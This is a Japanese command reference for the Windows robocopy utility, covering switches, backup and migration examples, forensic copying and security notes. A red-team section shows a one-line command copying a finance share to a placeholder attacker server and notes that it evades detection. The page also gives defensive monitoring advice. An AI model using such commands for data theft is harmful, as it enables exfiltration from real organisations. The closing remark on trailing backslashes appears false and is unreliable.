# `robocopy` - 堅牢なファイルコピー

## 概要

`robocopy` (Robust File Copy) は、ファイルやディレクトリツリーをコピーするための、非常に高機能で堅牢なコマンドラインユーティリティです。`copy` や `xcopy` とは異なり、ネットワークが不安定な場合でもリトライ機能を備え、ミラーリング（コピー元と先を同一にする）、詳細なログ出力、コピーするファイルの属性指定など豊富なオプションを提供します。サーバー間のデータ移行や、バックアップスクリプトの作成に不可欠なツールです。

(出自: `Windows標準搭載`)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 (あれば) |
| :--- | :--- | :--- |
| ⭐ **`xcopy`** | `xcopy` よりも `robocopy` の方が機能が豊富です。`robocopy` はリトライ機能、ミラーリング、ログ機能などを持ち、より信頼性が高いです。 | `robocopy` |
| **`copy`** | 単一または複数のファイルをコピーする基本コマンド。ディレクトリの再帰的なコピーはできません。 | `robocopy` |
| **PowerShell** | `Copy-Item -Recurse` は基本的なコピーを行いますが、`robocopy` のような高度なリトライやミラーリング機能は標準では持っていません。 | `robocopy` (堅牢な同期) |

## よく連携されるコマンド

`robocopy` は、その豊富なログ機能を活かし、実行結果をファイルに出力して後から確認する、というワークフローでよく利用されます。

### シナリオ例: 夜間バッチによる差分バックアップ (インフラ構築・運用視点)

* **目的**: 毎日深夜に、データディレクトリからバックアップサーバーへ、変更があったファイルのみをコピー（ミラーリング）し、実行ログを保存する。
* **連携コマンド**: (バッチファイル内)
* **解説**: `/MIR` でコピー元と先を同一にし（コピー元で削除されたファイルは先でも削除される）、`/LOG` で実行結果をログファイルに記録します。`/R` と `/W` でリトライ回数と待機時間を設定するのが定石です。
* **コマンド例**:

    ```cmd
    REM 差分バックアップを実行し、ログを日付付きファイルに保存
    robocopy \\FileServer\Data D:\Backups\Data /MIR /R:3 /W:5 /LOG+:C:\Logs\backup_%date:/=%.log /NP /TEE
    ```

## スイッチ/オプション説明

| スイッチ/オプション | 説明 |
| :--- | :--- |
| **コピー元と先** | |
| ⭐ `<Source>` | コピー元のディレクトリを指定します。 |
| ⭐ `<Destination>` | コピー先のディレクトリを指定します。 |
| **コピーオプション** | |
| ⭐ `/S` | サブディレクトリをコピーします（空のディレクトリは除く）。 |
| ⭐ `/E` | 空のサブディレクトリも含めてコピーします。 |
| ⭐ `/MIR` | ディレクトリツリーを**ミラーリング**します。`/E` と `/PURGE` の組み合わせと同等です。コピー先にあってコピー元にないファイル/ディレクトリは削除されます。 |
| ⭐ `/Z` | **再起動可能モード**。巨大なファイルのコピーが中断された場合に、途中から再開できます。 |
| `/COPY:<flags>` | コピーするファイル情報（属性）を指定します。デフォルトは `/COPY:DAT` (Data, Attributes, Timestamps)。セキュリティ情報を含めるには `/COPY:DATSOU` (Security, Owner, Auditing)。 |
| `/SEC` | セキュリティ情報 (NTFS ACL) もコピーします。`/COPY:DATS` と同等です。 |
| **フィルタリング** | |
| `/XF <file>` | 除外するファイルを指定します。ワイルドカード使用可。 |
| `/XD <dir>` | 除外するディレクトリを指定します。ワイルドカード使用可。 |
| **パフォーマンス** | |
| ⭐ `/R:<N>` | コピー失敗時の**リトライ (Retry)** 回数を指定します（デフォルト: 1,000,000）。 |
| ⭐ `/W:<N>` | リトライ時の**待機 (Wait)** 時間を秒単位で指定します（デフォルト: 30）。 |
| `/MT[:N]` | マルチスレッドでコピーを実行し、パフォーマンスを向上させます。`N` はスレッド数（1-128）、デフォルトは8。 |
| **ログオプション** | |
| ⭐ `/LOG:<file>` | ログファイルを指定したファイルに**上書き**します。 |
| ⭐ `/LOG+:<file>` | ログファイルを指定したファイルに**追記**します。 |
| `/NP` | 進行状況 (`%`) をログに出力しません。 |
| `/TEE` | ログファイルに書き出すと同時に、コンソールウィンドウにも出力します。 |

## よく使われる組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: ファイルサーバーのリプレースに伴い、全てのデータを新しいサーバーにACLを維持したまま移行する。
* **組み合わせ**: `/E /COPYALL /R:3 /W:5`
* **解説**: `/E` で空ディレクトリも、`/COPYALL` でデータ、属性、タイムスタンプ、ACL、所有者、監査情報の全てをコピーします。ネットワーク越しの移行ではリトライ設定 (`/R`, `/W`) が重要です。
* **例**:

    ```cmd
    REM 旧サーバーから新サーバーへデータを移行
    robocopy \\OldServer\Share \\NewServer\Share /E /COPYALL /R:3 /W:5 /MT
    ```

### 2. ブルーチーム視点

* **タスク**: **証拠保全 (Forensics)**。侵害されたホストの特定のディレクトリを、タイムスタンプやACLを完全に維持したまま調査用ストレージにコピーする。
* **組み合わせ**: `/E /COPYALL`
* **解説**: `robocopy` の `/COPYALL` は、ファイルのメタデータを可能な限り完全に複製するため、証拠の完全性を維持するのに役立ちます。
* **例**:

    ```cmd
    REM ユーザープロファイルをフォレンジック用ストレージに保全
    robocopy C:\Users\victim D:\Forensics\Case001\victim_profile /E /COPYALL
    ```

### 3. レッドチーム視点

* **タスク**: **データ窃取 (Data Exfiltration)**。大量のファイルを内部のファイルサーバーから、自身が制御するステージングサーバーへ収集する。
* **組み合わせ**: `/E`
* **解説**: 攻撃者は侵入後、`robocopy` を使って、ターゲットのファイルサーバーから大量のデータを効率的にコピーします。`robocopy` はWindows標準搭載であり、その実行は通常の管理業務と見分けがつきにくいため、検知を回避しやすいという利点があります。
* **例**:

    ```cmd
    REM ターゲットの共有フォルダーを、攻撃者が用意した別の共有フォルダーにコピー
    robocopy \\TargetServer\Finance \\AttackerServer\Loot /E
    ```

## エラーメッセージとトラブルシューティング

### よくあるエラーメッセージ

`robocopy` は終了コードで結果を示します。`0` はエラーなし、`1` はファイルコピー成功（エラーなし）、`2` はコピー先に余分なファイルがある、など `8` 未満は成功と見なされることが多いです。

1. **エラー**: `ERROR 5 (0x00000005) Accessing Destination Directory ... Access is denied.`
    * **考えられる原因**: コピー先のディレクトリへの書き込み権限がありません。
    * **解決策**: コマンドプロンプトを「管理者として実行」するか、コピー先のACLを確認・変更してください。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **脆弱性**: `robocopy` 自体ではなく、**ファイルの不正なコピー**が悪用されます。
* **悪用シナリオ**: レッドチームのシナリオで述べた通り、`robocopy` は攻撃者がデータを窃取したり、ラテラルムーブメントのためにツールをネットワーク内で拡散させたりするために利用されます。

### LOLBAS (Living Off The Land Binaries and Scripts) における利用例

* **機能**: **データ窃取 (Data Exfiltration)**, **偵察 (Reconnaissance)**
* **解説**: `robocopy` はWindowsに標準搭載されており、強力なファイルコピー機能を持つため、攻撃者が内部ネットワークでファイル操作を行うための非常に便利な「環境寄生型」ツールです。

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: ファイル共有やディレクトリに適切なACLを設定し、最小権限の原則を徹底する。
* **Detection (検知)**: `robocopy.exe` の実行、特に機密性の高いファイルサーバーやドメインコントローラーに対する実行を、プロセス監査ログやEDRで監視する。予期せぬ大量のファイル読み取りやネットワーク転送を監視する。

## 注意点・補足

* **パスの末尾の `\`**: コピー元・先のパスの末尾に `\` を付けるか付けないかで、ディレクトリ自体の扱いが変わることがあります。`robocopy C:\Source D:\Dest` は `D:\Dest\Source` を作成しますが、`robocopy C:\Source\ D:\Dest\` は `D:\Dest\` の直下に `Source` の中身をコピーします。挙動をテストしてから本番で実行することが推奨されます。
